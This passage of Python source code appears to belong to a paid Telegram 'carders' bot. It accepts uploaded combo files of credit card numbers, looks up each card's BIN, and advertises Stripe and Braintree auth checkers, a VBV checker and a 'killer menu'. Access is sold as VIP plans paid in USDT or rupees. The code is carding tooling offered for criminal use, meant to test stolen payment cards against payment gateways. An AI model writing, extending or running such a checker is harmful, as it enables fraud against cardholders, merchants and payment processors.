            bin_info["bank"] = data.get("bank", {}).get("name", "Unknown Bank")
            bin_info["brand"] = data.get("scheme", "Visa/MasterCard").capitalize()
            bin_info["country"] = data.get("country", {}).get("name", "Unknown")
            bin_info["type"] = data.get("type", "Debit").capitalize()
            bin_info["level"] = data.get("brand", "Classic")
            bin_info["flag"] = data.get("country", {}).get("emoji", "🏳️")
    except Exception as e:
        print(f"Error fetching BIN data: {e}")

    return bin_info

# 𝗣𝗟𝗔𝗡𝗦 𝗖𝗢𝗠𝗠𝗔𝗡𝗗
OWNER_LINK = "https://t.me/rajaraj909"

def get_usdt_to_inr():
    try:
        response = requests.get("https://api.binance.com/api/v3/ticker/price?symbol=USDTINR")
        data = response.json()
        return float(data["price"])
    except Exception as e:
        print(f"Error fetching USDT price: {e}")
        return 85

@bot.message_handler(commands=["plans"])
def plan_command(message):
    usdt_rate = get_usdt_to_inr()
    prices = {
        "10 Credits": (2, round(2 * usdt_rate)),
        "40 Credits": (4, round(4 * usdt_rate)),
        "80 Credits": (10, round(10 * usdt_rate)),
        "100 Credits": (20, round(20 * usdt_rate)),
    }

    price_message = "\n".join([f"🔹 𝗕𝗨𝗬 {k} ➝ {v[0]} 𝗨𝗦𝗗𝗧 | ₹{v[1]}" for k, v in prices.items()])

    plan_message = f"""
🎩 𝗩𝗜𝗣 𝗖𝗥𝗘𝗗𝗜𝗧 𝗣𝗟𝗔𝗡𝗦 💳  
━━━━━━━━━━━━━━━━━━━━━━  
📌 𝗟𝗜𝗩𝗘 𝗨𝗦𝗗𝗧 𝗥𝗔𝗧𝗘: 𝟭 𝗨𝗦𝗗𝗧 = ₹{usdt_rate}  
📌 𝗣𝗥𝗜𝗖𝗜𝗡𝗚 (𝗔𝗨𝗧𝗢-𝗨𝗣𝗗𝗔𝗧𝗘𝗗):  
{price_message}  
━━━━━━━━━━━━━━━━━━━━━━  
💡 𝗪𝗛𝗬 𝗕𝗨𝗬 𝗩𝗜𝗣 𝗖𝗥𝗘𝗗𝗜𝗧𝗦?  
✅ 𝗔𝗖𝗖𝗘𝗦𝗦 𝗘𝗫𝗖𝗟𝗨𝗦𝗜𝗩𝗘 𝗩𝗜𝗣 𝗙𝗘𝗔𝗧𝗨𝗥𝗘𝗦  
✅ 𝗙𝗔𝗦𝗧 & 𝗦𝗘𝗖𝗨𝗥𝗘 𝗧𝗥𝗔𝗡𝗦𝗔𝗖𝗧𝗜𝗢𝗡𝗦  
✅ 𝟮𝟰/𝟳 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗦𝗨𝗣𝗣𝗢𝗥𝗧  
━━━━━━━━━━━━━━━━━━━━━━  
📢 𝗖𝗟𝗜𝗖𝗞 𝗧𝗛𝗘 𝗕𝗨𝗧𝗧𝗢𝗡 𝗕𝗘𝗟𝗢𝗪 𝗧𝗢 𝗕𝗨𝗬 𝗖𝗥𝗘𝗗𝗜𝗧𝗦!  
"""

    keyboard = InlineKeyboardMarkup()
    keyboard.add(
        InlineKeyboardButton("💰 𝗕𝗨𝗬 𝗖𝗥𝗘𝗗𝗜𝗧𝗦 𝗡𝗢𝗪", url=OWNER_LINK)
    )

    bot.send_message(message.chat.id, plan_message, parse_mode="HTML", reply_markup=keyboard)

# 𝗛𝗘𝗟𝗣 𝗖𝗢𝗠𝗠𝗔𝗡𝗗
@bot.message_handler(commands=["help"])
def help_command(message):
    help_text = """
<code>╭───────────────────────────────
│ 🚀  𝗖𝗔𝗥𝗗𝗘𝗥𝗦 - 𝗩𝗜𝗣 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 🔥
╰───────────────────────────────</code>

✨ 𝗘𝗫𝗖𝗟𝗨𝗦𝗜𝗩𝗘 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦:  
━━━━━━━━━━━━━━━━━━━━━━━━━━━  
🔹 /owner - 👑 𝗢𝘄𝗻𝗲𝗿 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻  
🔹 /channel - 📢 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝗨𝗽𝗱𝗮𝘁𝗲𝘀  
🔹 /bin - 💳 𝗕𝗜𝗡 𝗟𝗼𝗼𝗸𝘂𝗽  
🔹 /vbv - 🔍 𝗩𝗕𝗩 𝗖𝗵𝗲𝗰𝗸𝗲𝗿  
🔹 /chk - ✅ 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵  
🔹 /su - 🏦 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵 𝗚𝗮𝘁𝗲  
🔹 /b3 - 💳 𝗕𝗿𝗮𝗶𝗻𝘁𝗿𝗲𝗲 𝗔𝘂𝘁𝗵  
🔹 /kill - 🔪 𝗞𝗶𝗹𝗹𝗲𝗿 𝗠𝗲𝗻𝘂  
🔹 /info - 📜 𝗨𝘀𝗲𝗿 𝗗𝗲𝘁𝗮𝗶𝗹𝘀  
🔹 /redeem - 🎟️ 𝗔𝗰𝘁𝗶𝘃𝗮𝘁𝗲 𝗩𝗜𝗣  

━━━━━━━━━━━━━━━━━━━━━━━━━━━  
💬 𝗡𝗘𝗘𝗗 𝗛𝗘𝗟𝗣? 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 @RAJARAJ909
📢 𝗦𝗧𝗔𝗬 𝗨𝗣𝗗𝗔𝗧𝗘𝗗: 𝗝𝗼𝗶𝗻 𝗢𝘂𝗿 𝗖𝗵𝗮𝗻𝗻𝗲𝗹  

━━━━━━━━━━━━━━━━━━━━━━━━━━━  
🔐 𝗔𝗗𝗠𝗜𝗡 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦:  
👮‍♂️ 𝗨𝘀𝗲 /𝗮𝗱𝗺𝗶𝗻 𝗳𝗼𝗿 𝗔𝗱𝗺𝗶𝗻 𝗠𝗲𝗻𝘂  

━━━━━━━━━━━━━━━━━━━━━━━━━━━  
<code>🚀 𝗖𝗔𝗥𝗗𝗘𝗥𝗦 - 𝗩𝗜𝗣 𝗘𝗫𝗖𝗟𝗨𝗦𝗜𝗩𝗘 🔥</code>
"""
    bot.reply_to(message, help_text, parse_mode="HTML", disable_web_page_preview=True)

# 𝗥𝗘𝗗𝗘𝗘𝗠 𝗦𝗬𝗦𝗧𝗘𝗠
owners = ["8178216102"]
LOGS_CHANNEL_ID = -1002374071862
valid_redeem_codes = {}

def is_user_allowed(user_id):
    current_time = time.time()
    try:
        with open("id.txt", "r") as file:
            allowed_ids = file.readlines()
            allowed_ids = [id.strip().split(":")[0] for id in allowed_ids]
            if str(user_id) in allowed_ids:
                return True
    except FileNotFoundError:
        print("id.txt file not found.")
    return False

def add_user(user_id, expire_time):
    with open("id.txt", "a") as file:
        file.write(f"{user_id}:{expire_time}\n")
    
    bot.send_message(user_id, f"✅ 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬 𝗥𝗘𝗗𝗘𝗘𝗠𝗘𝗗!\n𝗬𝗼𝘂𝗿 𝗮𝗰𝗰𝗲𝘀𝘀 𝗶𝘀 𝘃𝗮𝗹𝗶𝗱 𝘂𝗻𝘁𝗶𝗹 𝗯𝘁𝗶𝗺𝗲(𝗲𝘅𝗽𝗶𝗿𝗲_𝘁𝗶𝗺𝗲)𝗨𝗧𝗖.", parse_mode="HTML")

    bot.send_message(LOGS_CHANNEL_ID, f"✅ 𝗡𝗘𝗪 𝗨𝗦𝗘𝗥 𝗔𝗖𝗖𝗘𝗦𝗦\n👤 𝗨𝗦𝗘𝗥 𝗜𝗗: {user_id}\n🕒 𝗘𝗫𝗣𝗜𝗥𝗘𝗦 𝗢𝗡: {time.ctime(expire_time)}",
                     parse_mode="HTML")

def remove_expired_users():
    current_time = time.time()
    try:
        with open("id.txt", "r") as file:
            allowed_ids = file.readlines()
        with open("id.txt", "w") as file:
            for line in allowed_ids:
                user, expire = line.strip().split(":")
                if float(expire) < current_time:
                    bot.send_message(LOGS_CHANNEL_ID, f"❌ 𝗨𝗦𝗘𝗥 𝗔𝗖𝗖𝗘𝗦𝗦 𝗘𝗫𝗣𝗜𝗥𝗘𝗗\n👤 𝗨𝗦𝗘𝗥 𝗜𝗗: {user}\n🕒 𝗘𝗫𝗣𝗜𝗥𝗘𝗗 𝗢𝗡: {time.ctime(float(expire))}",
                                     parse_mode="HTML")
                    bot.send_message(user, "❌ 𝗬𝗢𝗨𝗥 𝗔𝗖𝗖𝗘𝗦𝗦 𝗛𝗔𝗦 𝗘𝗫𝗣𝗜𝗥𝗘𝗗. 𝗖𝗢𝗡𝗧𝗔𝗖𝗧 𝗦𝗨𝗣𝗣𝗢𝗥𝗧.")
                    continue
                file.write(line + "\n")
    except FileNotFoundError:
        print("id.txt file not found.")

def generate_redeem_code():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))

@bot.message_handler(commands=["code"])
def generate_code(message):
    if str(message.from_user.id) not in owners:
        bot.reply_to(message, "❌ 𝗬𝗢𝗨 𝗔𝗥𝗘 𝗡𝗢𝗧 𝗔𝗨𝗧𝗛𝗢𝗥𝗜𝗭𝗘𝗗 𝗧𝗢 𝗖𝗥𝗘𝗔𝗧𝗘 𝗖𝗢𝗗𝗘𝗦.")
        return

    args = message.text.split()
    if len(args) < 2 or not args[1].isdigit():
        bot.reply_to(message, "⚠️ 𝗨𝗦𝗔𝗚𝗘: /𝗰𝗼𝗱𝗲 <𝗱𝗮𝘆𝘀>\n𝗘𝘅𝗮𝗺𝗽𝗹𝗲: /𝗰𝗼𝗱𝗲 𝟯 𝗳𝗼𝗿 𝟯 𝗱𝗮𝘆𝘀", parse_mode="Markdown")
        return

    days = int(args[1])
    expire_time = time.time() + (days * 86400)
    code = generate_redeem_code()

    valid_redeem_codes[code] = expire_time

    bot.reply_to(message, f"✅ 𝗥𝗘𝗗𝗘𝗘𝗠 𝗖𝗢𝗗𝗘 𝗖𝗥𝗘𝗔𝗧𝗘𝗗:\n`{code}` (𝗩𝗮𝗹𝗶𝗱 𝗳𝗼𝗿 {days} 𝗱𝗮𝘆𝘀)", parse_mode="Markdown")

@bot.message_handler(commands=["redeem"])
def redeem_code(message):
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "⚠️ 𝗨𝗦𝗔𝗚𝗘: /𝗿𝗲𝗱𝗲𝗲𝗺 <𝗰𝗼𝗱𝗲>\n𝗘𝘅𝗮𝗺𝗽𝗹𝗲: /𝗿𝗲𝗱𝗲𝗲𝗺 𝗔𝗕𝗖𝟭𝟮𝟯𝗫𝗬𝗭", parse_mode="Markdown")
        return

    code = args[1]
    current_time = time.time()

    if code not in valid_redeem_codes:
        bot.reply_to(message, "❌ 𝗜𝗡𝗩𝗔𝗟𝗜𝗗 𝗥𝗘𝗗𝗘𝗘𝗠 𝗖𝗢𝗗𝗘.")
        return

    if valid_redeem_codes[code] < current_time:
        del valid_redeem_codes[code]
        bot.reply_to(message, "❌ 𝗧𝗛𝗜𝗦 𝗖𝗢𝗗𝗘 𝗛𝗔𝗦 𝗘𝗫𝗣𝗜𝗥𝗘𝗗.")
        return

    add_user(message.from_user.id, valid_redeem_codes[code])
    del valid_redeem_codes[code]

    bot.reply_to(message, f"✅ 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬 𝗥𝗘𝗗𝗘𝗘𝗠𝗘𝗗!\n𝗬𝗼𝘂𝗿 𝗮𝗰𝗰𝗲𝘀𝘀 𝗶𝘀 𝘃𝗮𝗹𝗶𝗱 𝘂𝗻𝘁𝗶𝗹 𝗯𝘁𝗶𝗺𝗲(𝗲𝘅𝗽𝗶𝗿𝗲_𝘁𝗶𝗺𝗲)𝗨𝗧𝗖.", parse_mode="HTML")

# 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧 𝗦𝗬𝗦𝗧𝗘𝗠
USER_FILE = "user.txt"

def get_registered_users():
    if not os.path.exists(USER_FILE):
        return []
    with open(USER_FILE, "r") as file:
        users = file.readlines()
    return [line.split(",")[0] for line in users]

@bot.message_handler(commands=["broadcast"])
def broadcast_message(message):
    user_id = str(message.from_user.id)

    if user_id not in owners:
        bot.reply_to(message, "❌ 𝗬𝗢𝗨 𝗔𝗥𝗘 𝗡𝗢𝗧 𝗔𝗨𝗧𝗛𝗢𝗥𝗜𝗭𝗘𝗗 𝗧𝗢 𝗨𝗦𝗘 𝗧𝗛𝗜𝗦 𝗖𝗢𝗠𝗠𝗔𝗡𝗗.")
        return

    bot.reply_to(message, "📢 𝗦𝗘𝗡𝗗 𝗧𝗛𝗘 𝗠𝗘𝗦𝗦𝗔𝗚𝗘, 𝗦𝗧𝗜𝗖𝗞𝗘𝗥, 𝗚𝗜𝗙, 𝗢𝗥 𝗩𝗜𝗗𝗘𝗢 𝗬𝗢𝗨 𝗪𝗔𝗡𝗧 𝗧𝗢 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧.")
    bot.register_next_step_handler(message, send_broadcast)

def send_broadcast(message):
    user_id = str(message.from_user.id)
    registered_users = get_registered_users()

    keyboard = InlineKeyboardMarkup()
    keyboard.add(
        InlineKeyboardButton("👑 𝗢𝗪𝗡𝗘𝗥", url="https://t.me/rajaraj909"),
        InlineKeyboardButton("🔥 𝗖𝗛𝗔𝗡𝗡𝗘𝗟", url="https://t.me/rajaraj_05")
    )

    success_count = 0
    failed_count = 0

    for user in registered_users:
        try:
            if message.text:
                bot.send_message(user, message.text, reply_markup=keyboard)
            elif message.photo:
                bot.send_photo(user, message.photo[-1].file_id, caption=message.caption or "", reply_markup=keyboard)
            elif message.sticker:
                bot.send_sticker(user, message.sticker.file_id, reply_markup=keyboard)
            elif message.animation:
                bot.send_animation(user, message.animation.file_id, caption=message.caption or "", reply_markup=keyboard)
            elif message.video:
                bot.send_video(user, message.video.file_id, caption=message.caption or "", reply_markup=keyboard)
            else:
                continue

            success_count += 1
        except Exception as e:
            print(f"Failed to send to {user}: {e}")
            failed_count += 1

    bot.send_message(user_id, f"✅ 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗!\n📨 𝗦𝗘𝗡𝗧: {success_count}\n❌ 𝗙𝗔𝗜𝗟𝗘𝗗: {failed_count}")

# 𝗨𝗦𝗘𝗥 𝗠𝗔𝗡𝗔𝗚𝗘𝗠𝗘𝗡𝗧
def is_registered(user_id):
    if not os.path.exists(USER_FILE):
        return False
    with open(USER_FILE, "r") as file:
        registered_users = file.readlines()
    return str(user_id) in [line.split(",")[0] for line in registered_users]

def register_user(user_id, first_name, username):
    with open(USER_FILE, "a") as file:
        file.write(f"{user_id},{first_name},{username}\n")

@bot.message_handler(commands=["start"])
def start(message):
    user_id = str(message.from_user.id)
    first_name = message.from_user.first_name or "Unknown"
    username = message.from_user.username or "No Username"

    if not is_registered(user_id):
        register_user(user_id, first_name, username)

    if is_user_allowed(user_id):
        response = f"""
<code>╭──────────────────────────
│ 🔥  𝗖𝗔𝗥𝗗𝗘𝗥𝗦 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 🔥
╰──────────────────────────</code>

👤 𝗪𝗘𝗟𝗖𝗢𝗠𝗘, {first_name}!  
💠 𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘: @{username}  
🔹 𝗨𝗦𝗘𝗥 𝗜𝗗: {user_id}  

💳 𝗦𝗘𝗡𝗗 𝗬𝗢𝗨𝗥 𝗖𝗢𝗠𝗕𝗢, 𝗔𝗡𝗗 𝗜 𝗪𝗜𝗟𝗟 𝗖𝗛𝗘𝗖𝗞 𝗬𝗢𝗨𝗥 𝗖𝗖.  
📌 𝗨𝗦𝗘 /𝗵𝗲𝗹𝗽 𝘁𝗼 𝘀𝗲𝗲 𝗮𝗹𝗹 𝗳𝗲𝗮𝘁𝘂𝗿𝗲𝘀! 🚀  
"""
    else:
        response = f"""
<code>╭──────────────────────────
│ ❌ 𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗 ❌
╰──────────────────────────</code>

🚫 𝗬𝗢𝗨 𝗔𝗥𝗘 𝗡𝗢𝗧 𝗔𝗨𝗧𝗛𝗢𝗥𝗜𝗭𝗘𝗗 𝗧𝗢 𝗨𝗦𝗘 𝗧𝗛𝗜𝗦 𝗕𝗢𝗧.  
💎 𝗨𝗡𝗟𝗢𝗖𝗞 𝗙𝗨𝗟𝗟 𝗔𝗖𝗖𝗘𝗦𝗦 𝗕𝗬 𝗣𝗨𝗥𝗖𝗛𝗔𝗦𝗜𝗡𝗚 𝗔 𝗣𝗟𝗔𝗡:

<code>╭──────────────────────────
│ 💰 𝗩𝗜𝗣 𝗣𝗟𝗔𝗡𝗦 💰
╰──────────────────────────</code>

⏳ 𝟭 𝗗𝗔𝗬: 𝟲𝟬 𝗥𝗦  
📆 𝟳 𝗗𝗔𝗬𝗦: 𝟭𝟴𝟬 𝗥𝗦  
🗓️ 𝟭 𝗠𝗢𝗡𝗧𝗛: 𝟰𝟬𝟬 𝗥𝗦  
🔱 𝗟𝗜𝗙𝗘𝗧𝗜𝗠𝗘: 𝟴𝟬𝟬 𝗥𝗦  

📩 𝗖𝗢𝗡𝗧𝗔𝗖𝗧: @RAJARAJ909 𝘁𝗼 𝗕𝘂𝘆 𝗩𝗜𝗣!  

🚀 𝗙𝗢𝗥 𝗙𝗥𝗘𝗘 𝗔𝗖𝗖𝗘𝗦𝗦, 𝗨𝗦𝗘: /𝗵𝗲𝗹𝗽  
"""

    bot.reply_to(message, response, parse_mode="HTML", disable_web_page_preview=True)

# 𝗔𝗗𝗠𝗜𝗡 𝗨𝗦𝗘𝗥 𝗠𝗔𝗡𝗔𝗚𝗘𝗠𝗘𝗡𝗧
LOGS_GROUP_CHAT_ID = -1002374071862
owners = {"8178216102"}

@bot.message_handler(commands=["add"])
def add_user_command(message):
    if str(message.from_user.id) not in owners:
        bot.reply_to(message, "❌ 𝗬𝗢𝗨 𝗔𝗥𝗘 𝗡𝗢𝗧 𝗔𝗨𝗧𝗛𝗢𝗥𝗜𝗭𝗘𝗗.")
        return
    
    parts = message.text.split()
    if len(parts) < 3:
        bot.reply_to(message, "⚠️ 𝗣𝗟𝗘𝗔𝗦𝗘 𝗣𝗥𝗢𝗩𝗜𝗗𝗘 𝗔 𝗨𝗦𝗘𝗥 𝗜𝗗 𝗔𝗡𝗗 𝗗𝗨𝗥𝗔𝗧𝗜𝗢𝗡 𝗜𝗡 𝗗𝗔𝗬𝗦. 𝗨𝗦𝗔𝗚𝗘: /𝗮𝗱𝗱 <𝘂𝘀𝗲𝗿_𝗶𝗱> <𝗱𝗮𝘆𝘀>")
        return
    
    user_id_to_add = parts[1]
    try:
        days = int(parts[2])
    except ValueError:
        bot.reply_to(message, "⚠️ 𝗜𝗡𝗩𝗔𝗟𝗜𝗗 𝗡𝗨𝗠𝗕𝗘𝗥 𝗢𝗙 𝗗𝗔𝗬𝗦. 𝗣𝗟𝗘𝗔𝗦𝗘 𝗘𝗡𝗧𝗘𝗥 𝗔 𝗩𝗔𝗟𝗜𝗗 𝗜𝗡𝗧𝗘𝗚𝗘𝗥.")
        return
    
    expire_time = time.time() + (days * 86400)
    with open("id.txt", "a") as file:
        file.write(f"{user_id_to_add}:{expire_time}\n")
    
    bot.send_message(user_id_to_add, f"✅ 𝗬𝗢𝗨 𝗛𝗔𝗩𝗘 𝗕𝗘𝗘𝗡 𝗔𝗨𝗧𝗛𝗢𝗥𝗜𝗭𝗘𝗗 𝗙𝗢𝗥 {days} 𝗗𝗔𝗬𝗦. 𝗘𝗫𝗣𝗜𝗥𝗘𝗦 𝗢𝗡: {time.ctime(expire_time)}", parse_mode="HTML")
    log_message = (
        f"<b>✅ 𝗨𝗦𝗘𝗥 𝗔𝗗𝗗𝗘𝗗</b>\n"
        f"👤 𝗨𝗦𝗘𝗥 𝗜𝗗: {user_id_to_add}\n"
        f"🕒 𝗘𝗫𝗣𝗜𝗥𝗘𝗦 𝗢𝗡: {time.ctime(expire_time)}"
    )
    bot.send_message(LOGS_GROUP_CHAT_ID, log_message, parse_mode="HTML")
    bot.reply_to(message, f"✅ 𝗨𝗦𝗘𝗥 {user_id_to_add} 𝗔𝗗𝗗𝗘𝗗 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬 𝗙𝗢𝗥 {days} 𝗗𝗔𝗬𝗦.")

@bot.message_handler(commands=["remove"])
def remove_user_command(message):
    if str(message.from_user.id) not in owners:
        bot.reply_to(message, "❌ 𝗬𝗢𝗨 𝗔𝗥𝗘 𝗡𝗢𝗧 𝗔𝗨𝗧𝗛𝗢𝗥𝗜𝗭𝗘𝗗.")
        return
    
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "⚠️ 𝗣𝗟𝗘𝗔𝗦𝗘 𝗣𝗥𝗢𝗩𝗜𝗗𝗘 𝗔 𝗨𝗦𝗘𝗥 𝗜𝗗 𝗧𝗢 𝗥𝗘𝗠𝗢𝗩𝗘. 𝗨𝗦𝗔𝗚𝗘: /𝗿𝗲𝗺𝗼𝘃𝗲 <𝘂𝘀𝗲𝗿_𝗶𝗱>")
        return
    
    user_id_to_remove = parts[1]
    try:
        with open("id.txt", "r") as file:
            lines = file.readlines()
        
        valid_lines = []
        user_removed = False
        for line in lines:
            line = line.strip()
            if not line:
                continue
            
            parts = line.split(":")
            if len(parts) != 2:
                print(f"Skipping invalid entry: {line}")
                continue
            
            user, expire = parts
            if user == user_id_to_remove:
                user_removed = True
                bot.send_message(user_id_to_remove, "❌ 𝗬𝗢𝗨𝗥 𝗔𝗖𝗖𝗘𝗦𝗦 𝗛𝗔𝗦 𝗕𝗘𝗘𝗡 𝗥𝗘𝗩𝗢𝗞𝗘𝗗.")
                continue
            
            valid_lines.append(f"{user}:{expire}")
        
        with open("id.txt", "w") as file:
            file.write("\n".join(valid_lines) + "\n")
        
        if user_removed:
            log_message = (
                f"<b>🗑️ 𝗨𝗦𝗘𝗥 𝗥𝗘𝗠𝗢𝗩𝗘𝗗</b>\n"
                f"👤 𝗨𝗦𝗘𝗥 𝗜𝗗: {user_id_to_remove}\n"
            )
            bot.send_message(LOGS_GROUP_CHAT_ID, log_message, parse_mode="HTML")
            bot.reply_to(message, f"✅ 𝗨𝗦𝗘𝗥 {user_id_to_remove} 𝗥𝗘𝗠𝗢𝗩𝗘𝗗 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬.")
        else:
            bot.reply_to(message, "⚠️ 𝗨𝗦𝗘𝗥 𝗡𝗢𝗧 𝗙𝗢𝗨𝗡𝗗 𝗜𝗡 𝗧𝗛𝗘 𝗔𝗨𝗧𝗛𝗢𝗥𝗜𝗭𝗘𝗗 𝗟𝗜𝗦𝗧.")
    
    except FileNotFoundError:
        bot.reply_to(message, "⚠️ 𝗔𝗨𝗧𝗛𝗢𝗥𝗜𝗭𝗔𝗧𝗜𝗢𝗡 𝗙𝗜𝗟𝗘 𝗡𝗢𝗧 𝗙𝗢𝗨𝗡𝗗.")
    except Exception as e:
        bot.reply_to(message, f"⚠️ 𝗔𝗡 𝗘𝗥𝗥𝗢𝗥 𝗢𝗖𝗖𝗨𝗥𝗥𝗘𝗗: {e}")

# 𝗨𝗦𝗘𝗥 𝗜𝗡𝗙𝗢 𝗖𝗢𝗠𝗠𝗔𝗡𝗗
@bot.message_handler(commands=["info"])
def user_info(message):
    user_id = str(message.chat.id)
    first_name = message.from_user.first_name or "N/A"
    last_name = message.from_user.last_name or "N/A"
    username = message.from_user.username or "N/A"
    profile_link = f"<a href='tg://user?id={user_id}'>𝗣𝗥𝗢𝗙𝗜𝗟𝗘 𝗟𝗜𝗡𝗞</a>"

    current_time = datetime.now().strftime("%I:%M %p")
    current_day = datetime.now().strftime("%A, %b %d, %Y")

    if user_id in owners:
        status = "👑 𝗢𝗪𝗡𝗘𝗥 🛡️"
    else:
        status = "⛔ 𝗡𝗢𝗧-𝗔𝗨𝗧𝗛𝗢𝗥𝗜𝗭𝗘𝗗 ❌"

    try:
        with open("id.txt", "r") as file:
            allowed_ids = file.readlines()
            for line in allowed_ids:
                parts = line.strip().split(":")
                if len(parts) == 2:
                    user, expire = parts
                    if user_id == user:
                        expiry_time = float(expire)
                        if expiry_time > time.time():
                            status = "✅ 𝗔𝗨𝗧𝗛𝗢𝗥𝗜𝗭𝗘𝗗 𝗨𝗦𝗘𝗥"
                        else:
                            status = "❌ 𝗔𝗖𝗖𝗘𝗦𝗦 𝗘𝗫𝗣𝗜𝗥𝗘𝗗"
                        break
    except FileNotFoundError:
        status = "⚠️ 𝗔𝗨𝗧𝗛𝗢𝗥𝗜𝗭𝗔𝗧𝗜𝗢𝗡 𝗙𝗜𝗟𝗘 𝗠𝗜𝗦𝗦𝗜𝗡𝗚"

    response = f"""
<code>╭──────────────────────────
│ 🔍 𝗨𝗦𝗘𝗥 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 🔥
╰──────────────────────────</code>

👤 𝗙𝗜𝗥𝗦𝗧 𝗡𝗔𝗠𝗘: {first_name}  
👤 𝗟𝗔𝗦𝗧 𝗡𝗔𝗠𝗘: {last_name}  
🆔 𝗨𝗦𝗘𝗥 𝗜𝗗: {user_id}  
📛 𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘: @{username}  
🔗 𝗣𝗥𝗢𝗙𝗜𝗟𝗘 𝗟𝗜𝗡𝗞: {profile_link}  
📋 𝗦𝗧𝗔𝗧𝗨𝗦: {status}  

<code>╭──────────────────────────
│ 🕒 𝗧𝗜𝗠𝗘 & 𝗗𝗔𝗧𝗘 📆
╰──────────────────────────</code>

🕒 𝗧𝗜𝗠𝗘: {current_time}  
📆 𝗗𝗔𝗬: {current_day}  

<code>╭──────────────────────────
│ 🚀  𝗖𝗔𝗥𝗗𝗘𝗥𝗦 𝗕𝗢𝗧 🔥
╰──────────────────────────</code>
"""
    bot.reply_to(message, response, parse_mode="HTML", disable_web_page_preview=True)

# 𝗗𝗢𝗖𝗨𝗠𝗘𝗡𝗧 𝗛𝗔𝗡𝗗𝗟𝗘𝗥
def is_bot_stopped():
    return os.path.exists("stop.stop")

@bot.message_handler(content_types=["document"])
def main(message):
    if not is_user_allowed(message.from_user.id):
        bot.reply_to(message, "𝗬𝗢𝗨 𝗔𝗥𝗘 𝗡𝗢𝗧 𝗔𝗨𝗧𝗛𝗢𝗥𝗜𝗭𝗘𝗗 𝗧𝗢 𝗨𝗦𝗘 𝗧𝗛𝗜𝗦 𝗕𝗢𝗧. 𝗙𝗢𝗥 𝗔𝗨𝗧𝗛𝗢𝗥𝗜𝗭𝗔𝗧𝗜𝗢𝗡 𝗗𝗠 @RAJARAJ909")
        return
    
    dd = 0
    live = 0
    ch = 0
    ko = (bot.reply_to(message, "𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗬𝗢𝗨𝗥 𝗖𝗔𝗥𝗗𝗦...⌛").message_id)
    username = message.from_user.username or "N/A"
    ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
        
    with open("combo.txt", "wb") as w:
        w.write(ee)
        
    start_time = time.time()
        
    try:
        with open("combo.txt", 'r') as file:
            lino = file.readlines()
            total = len(lino)
            if total > 2001:
                bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=f"🚨 𝗢𝗢𝗣𝗦! 𝗧𝗛𝗜𝗦 𝗙𝗜𝗟𝗘 𝗖𝗢𝗡𝗧𝗔𝗜𝗡𝗦 {total} 𝗖𝗖𝗦, 𝗪𝗛𝗜𝗖𝗛 𝗘𝗫𝗖𝗘𝗘𝗗𝗦 𝗧𝗛𝗘 𝟮𝟬𝟬𝟬 𝗖𝗖 𝗟𝗜𝗠𝗜𝗧! 🚫 𝗣𝗟𝗘𝗔𝗦𝗘 𝗣𝗥𝗢𝗩𝗜𝗗𝗘 𝗔 𝗙𝗜𝗟𝗘 𝗪𝗜𝗧𝗛 𝗙𝗘𝗪𝗘𝗥 𝗧𝗛𝗔𝗡 𝟱𝟬𝟬 𝗖𝗖𝗦 𝗙𝗢𝗥 𝗦𝗠𝗢𝗢𝗧𝗛 𝗣𝗥𝗢𝗖𝗘𝗦𝗦𝗜𝗡𝗚. 🔥")
                return
                
            for cc in lino:
                current_dir = os.getcwd()
                for filename in os.listdir(current_dir):
                    if filename.endswith(".stop"):
                        bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅\n𝗕𝗢𝗧 𝗕𝗬 ➜ @RAJARAJ909')
                        os.remove('stop.stop')
                        return
            
                try:
                    data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6]).json()
                except:
                    pass
                try:
                    bank=(data['bank'])
                except:
                    bank=('N/A')
                try:
                    brand=(data['brand'])
                except:
                    brand=('N/A')
                try:
                    emj=(data['country_flag'])
                except:
                    emj=('N/A')
                try:
                    cn=(data['country_name'])
                except:
                    cn=('N/A')
                try:
                    dicr=(data['level'])
                except:
                    dicr=('N/A')
                try:
                    typ=(data['type'])
                except:
                    typ=('N/A')
                try:
                    url=(data['bank']['url'])
                except:
                    url=('N/A')
                mes = types.InlineKeyboardMarkup(row_width=1)
                cm1 = types.InlineKeyboardButton(f"• {cc} •", callback_data='u8')
                cm2 = types.InlineKeyboardButton(f"• 𝗔𝗨𝗧𝗛 ✅: [ {ch} ] •", callback_data='x')
                cm3 = types.InlineKeyboardButton(f"• 𝗖𝗖𝗡 ✅ : [ {live} ] •", callback_data='x')
                cm4 = types.InlineKeyboardButton(f"• 𝗗𝗘𝗔𝗗 ❌ : [ {dd} ] •", callback_data='x')
